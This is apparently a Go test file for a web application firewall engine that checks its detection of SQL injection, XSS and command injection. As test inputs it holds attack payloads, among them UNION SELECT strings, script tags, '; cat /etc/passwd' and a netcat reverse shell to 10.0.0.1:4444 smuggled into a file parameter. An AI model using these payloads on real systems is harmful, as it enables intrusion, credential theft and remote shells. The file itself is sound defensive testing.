package waf

import (
	"net/http"
	"testing"
)

func TestLexicalEngineSQLiDetection(t *testing.T) {
	eng := NewLexicalEngine()
	if eng.Name() != "libinjection-go" {
		t.Fatalf("expected name 'libinjection-go', got %q", eng.Name())
	}

	tests := []struct {
		name        string
		ctx         *RequestContext
		expectBlock bool
		expectRule  string
	}{
		{
			name: "Benign request",
			ctx: &RequestContext{
				Path:   "/api/products",
				Query:  "category=shoes&sort=asc",
				Method: "GET",
			},
			expectBlock: false,
		},
		{
			name: "SQLi in query parameter",
			ctx: &RequestContext{
				Path:   "/api/users",
				Query:  "id=1%27+OR+%271%27%3D%271",
				Method: "GET",
			},
			expectBlock: true,
			expectRule:  "SQLI_QUERY_PARAM",
		},
		{
			name: "SQLi in raw Query",
			ctx: &RequestContext{
				Path:   "/search",
				Query:  "-1 UNION SELECT 1,2,password FROM users",
				Method: "GET",
			},
			expectBlock: true,
			expectRule:  "SQLI_QUERY",
		},
		{
			name: "SQLi in Cookie Header",
			ctx: &RequestContext{
				Path:   "/dashboard",
				Method: "GET",
				Headers: http.Header{
					"Cookie": []string{"session=123; tracking=1' UNION SELECT 1,version()--"},
				},
			},
			expectBlock: true,
			expectRule:  "SQLI_HEADER",
		},
		{
			name: "SQLi in Body",
			ctx: &RequestContext{
				Path:   "/login",
				Method: "POST",
				Body:   []byte(`admin' --`),
			},
			expectBlock: true,
			expectRule:  "SQLI_BODY",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			verdict, err := eng.InspectRequest(tt.ctx)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if tt.expectBlock {
				if verdict.Action != ActionBlock {
					t.Fatalf("expected ActionBlock, got %v", verdict.Action)
				}
				if verdict.RuleID != tt.expectRule {
					t.Errorf("expected RuleID %q, got %q", tt.expectRule, verdict.RuleID)
				}
			} else {
				if verdict.Action != ActionAllow {
					t.Fatalf("expected ActionAllow, got %v", verdict.Action)
				}
			}
		})
	}
}

func TestLexicalEngineXSSDetection(t *testing.T) {
	eng := NewLexicalEngine()

	tests := []struct {
		name        string
		ctx         *RequestContext
		expectBlock bool
		expectRule  string
	}{
		{
			name: "Benign input",
			ctx: &RequestContext{
				Path:  "/comment",
				Query: "msg=Hello+world%21",
			},
			expectBlock: false,
		},
		{
			name: "XSS in Query Param",
			ctx: &RequestContext{
				Path:  "/search",
				Query: "q=%3Cscript%3Ealert(1)%3C/script%3E",
			},
			expectBlock: true,
			expectRule:  "XSS_QUERY_PARAM",
		},
		{
			name: "XSS in Body",
			ctx: &RequestContext{
				Path: "/submit",
				Body: []byte(`<img src=x onerror=alert('XSS')>`),
			},
			expectBlock: true,
			expectRule:  "XSS_BODY",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			verdict, err := eng.InspectRequest(tt.ctx)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if tt.expectBlock {
				if verdict.Action != ActionBlock {
					t.Fatalf("expected ActionBlock, got %v", verdict.Action)
				}
				if verdict.RuleID != tt.expectRule {
					t.Errorf("expected RuleID %q, got %q", tt.expectRule, verdict.RuleID)
				}
			} else {
				if verdict.Action != ActionAllow {
					t.Fatalf("expected ActionAllow, got %v", verdict.Action)
				}
			}
		})
	}
}

func TestLexicalEngineCmdIDetection(t *testing.T) {
	eng := NewLexicalEngine()

	tests := []struct {
		name        string
		ctx         *RequestContext
		expectBlock bool
		expectRule  string
	}{
		{
			name: "Benign input with harmless characters",
			ctx: &RequestContext{
				Path:  "/status",
				Query: "system=online&version=2.0",
			},
			expectBlock: false,
		},
		{
			name: "Command injection in query param with semicolon and binary",
			ctx: &RequestContext{
				Path:  "/ping",
				Query: "host=127.0.0.1%3B+cat+%2Fetc%2Fpasswd",
			},
			expectBlock: true,
			expectRule:  "CMDI_QUERY_PARAM",
		},
		{
			name: "Command injection with substitution $(whoami)",
			ctx: &RequestContext{
				Path:  "/exec",
				Query: "name=%24%28whoami%29",
			},
			expectBlock: true,
			expectRule:  "CMDI_QUERY_PARAM",
		},
		{
			name: "Command injection with pipe and nc",
			ctx: &RequestContext{
				Path:  "/export",
				Query: "file=report.csv%7Cnc+-e+%2Fbin%2Fsh+10.0.0.1+4444",
			},
			expectBlock: true,
			expectRule:  "CMDI_QUERY_PARAM",
		},
		{
			name: "Command injection in raw query",
			ctx: &RequestContext{
				Path:  "/export",
				Query: "report.csv | nc 10.0.0.1 4444",
			},
			expectBlock: true,
			expectRule:  "CMDI_QUERY",
		},
		{
			name: "Command injection with backticks in body",
			ctx: &RequestContext{
				Path: "/run",
				Body: []byte("param=`id`"),
			},
			expectBlock: true,
			expectRule:  "CMDI_BODY",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			verdict, err := eng.InspectRequest(tt.ctx)
			if err != nil {
				t.Fatalf("unexpected error: %v", err)
			}
			if tt.expectBlock {
				if verdict.Action != ActionBlock {
					t.Fatalf("expected ActionBlock, got %v", verdict.Action)
				}
				if verdict.RuleID != tt.expectRule {
					t.Errorf("expected RuleID %q, got %q", tt.expectRule, verdict.RuleID)
				}
			} else {
				if verdict.Action != ActionAllow {
					t.Fatalf("expected ActionAllow, got %v", verdict.Action)
				}
			}
		})
	}
}

func TestTriageClassification(t *testing.T) {
	tests := []struct {
		input    string
		expected TriageResult
	}{
		{"", TriageBenign},
		{"normal_text_value", TriageBenign},
		{"product_id=12345", TriageBenign},
		{"1' OR '1'='1", TriageSuspectSQLi},
		{"admin' --", TriageSuspectSQLi},
		{"<script>alert(1)</script>", TriageSuspectXSS},
		{"; cat /etc/passwd", TriageSuspectCmdI},
		{"$(whoami)", TriageSuspectCmdI},
		{"`id`", TriageSuspectCmdI},
		{"| nc 127.0.0.1 1337", TriageSuspectCmdI},
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			res := Triage(tt.input)
			if res != tt.expected {
				t.Errorf("Triage(%q) = %v, expected %v", tt.input, res, tt.expected)
			}
		})
	}
}

func BenchmarkLexicalTriage(b *testing.B) {
	payloads := []string{
		"category=electronics&brand=apple&sort=price_asc&page=2",
		"admin' OR 1=1--",
		"<script>alert('xss')</script>",
		"127.0.0.1; cat /etc/passwd",
		"normal simple search string",
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		p := payloads[i%len(payloads)]
		_ = Triage(p)
	}
}
